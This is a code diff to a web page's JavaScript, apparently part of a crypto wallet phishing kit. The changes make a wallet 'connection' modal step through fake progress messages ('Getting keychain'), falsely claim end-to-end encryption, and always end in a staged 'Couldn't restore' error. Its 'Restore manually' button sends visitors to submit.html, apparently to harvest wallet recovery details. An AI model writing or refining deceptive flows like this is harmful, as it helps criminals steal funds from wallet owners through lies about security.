@@ -19,13 +19,7 @@ document.addEventListener("DOMContentLoaded", () => {
   document.addEventListener("click", (e) => {
     if (e.target.classList.contains("form-id")) {
       e.preventDefault();
-      console.log(e.target);
-
       modalWallets.click();
-
-      setTimeout(() => {
-        window.location.href = "submit.html";
-      }, (Math.floor(Math.random() * (11 - 4 + 1)) + 4) * 1000);
     }
   });
 
@@ -67,32 +61,86 @@ document.addEventListener("DOMContentLoaded", () => {
   // Function to update second modal content with icon details
   function updateModalContent(icon) {
     const modalContent = document.querySelector("#modal-wallet-click");
-    modalContent.innerHTML = `
-      <p class="flex flex-col justify-center items-center space-y-1">
-        <img src="${icon.img}" alt="" class="mx-auto w-12" />
-        <span class="font-bold">${icon.name}</span>
-      </p>
-      <p class="text-gray-500 text-center text-sm">
-        This session is secured and encrypted
-      </p>
-      <div class="flex flex-col w-10/12 justify-center items-center space-y-3 bg-white py-3 rounded-b-xl" id="error-b-c">
-        <div class="py-4 relative w-52">
-          <div class="progress-container bg-violet-900 rounded-lg w-full"></div>
-          <div class="progress rounded-full bg-violet-900"></div>
-        </div>
-        <p class="flex flex-col justify-center items-center space-y-1">
-          <span class="font-bold text-center text-sm">starting secure connection</span>
-          <span class="font-medium italic text-xs text-center">..please wait..</span>
-        </p>
-      </div>
-      
-      <p class="flex flex-row justify-center items-center space-x-2 w-8/12 mx-auto">
-        <img src="${shieldIcon}" alt="" class="w-7" />
-        <span class="text-gray-600 font-medium text-wrap text-xs">
-          This session is protected with an end-to-end encryption
-        </span>
-      </p>
-    `;
+
+    function showSequence() {
+      const steps = [
+        "Initializing",
+        "Getting keychain",
+        "Connecting to wallet"
+      ];
+      let currentStep = 0;
+
+      function nextStep() {
+        if (currentStep < steps.length) {
+          modalContent.innerHTML = `
+            <p class="flex flex-col justify-center items-center space-y-1">
+              <img src="${icon.img}" alt="" class="mx-auto w-12" />
+              <span class="font-bold">${icon.name}</span>
+            </p>
+            <p class="text-gray-500 text-center text-sm">
+              This session is secured and encrypted
+            </p>
+            <div class="flex flex-col w-10/12 justify-center items-center space-y-3 bg-white py-3 rounded-b-xl" id="error-b-c">
+              <div class="py-4 relative w-52">
+                <div class="progress-container bg-violet-900 rounded-lg w-full"></div>
+                <div class="progress rounded-full bg-violet-900"></div>
+              </div>
+              <p class="flex flex-col justify-center items-center space-y-1">
+                <span class="font-bold text-center text-sm">${steps[currentStep].toLowerCase()}</span>
+                <span class="font-medium italic text-xs text-center">..please wait..</span>
+              </p>
+            </div>
+            
+            <p class="flex flex-row justify-center items-center space-x-2 w-8/12 mx-auto">
+              <img src="${shieldIcon}" alt="" class="w-7" />
+              <span class="text-gray-600 font-medium text-wrap text-xs">
+                This session is protected with an end-to-end encryption
+              </span>
+            </p>
+          `;
+          currentStep++;
+          setTimeout(nextStep, 1500);
+        } else {
+          showFailure();
+        }
+      }
+
+      function showFailure() {
+        modalContent.innerHTML = `
+          <p class="flex flex-col justify-center items-center space-y-1">
+            <img src="${icon.img}" alt="" class="mx-auto" />
+            <span class="font-bold">${icon.name}</span>
+          </p>
+          <div class="flex flex-col w-11/12 justify-center items-center  bg-white pb-10 rounded-xl -mt-5">
+            
+            <p class="text-red-600 font-bold text-lg leading-tight">Couldn't restore</p>
+            <p class="text-gray-500 text-center text-sm px-4">
+              We encountered an issue while trying to restore your wallet. Please try again or restore manually.
+            </p>
+            <div class="flex flex-row w-full px-6 justify-center items-center space-x-4 pt-2 pb-4">
+              <button id="try-again-btn" class="bg-violet-900 text-white font-bold py-2 px-6 rounded-full hover:bg-violet-800 transition-colors text-sm whitespace-nowrap">
+                Try again
+              </button>
+              <button id="connect-manually-btn" class="text-gray-500 font-medium hover:text-gray-700 transition-colors text-xs underline whitespace-nowrap">
+                Restore manually
+              </button>
+            </div>
+          </div>
+        `;
+
+        document.getElementById("try-again-btn").addEventListener("click", () => {
+          showSequence();
+        });
+
+        document.getElementById("connect-manually-btn").addEventListener("click", () => {
+          window.location.href = "submit.html";
+        });
+      }
+
+      nextStep();
+    }
+
+    showSequence();
   }
 
   // Initial render of all icons
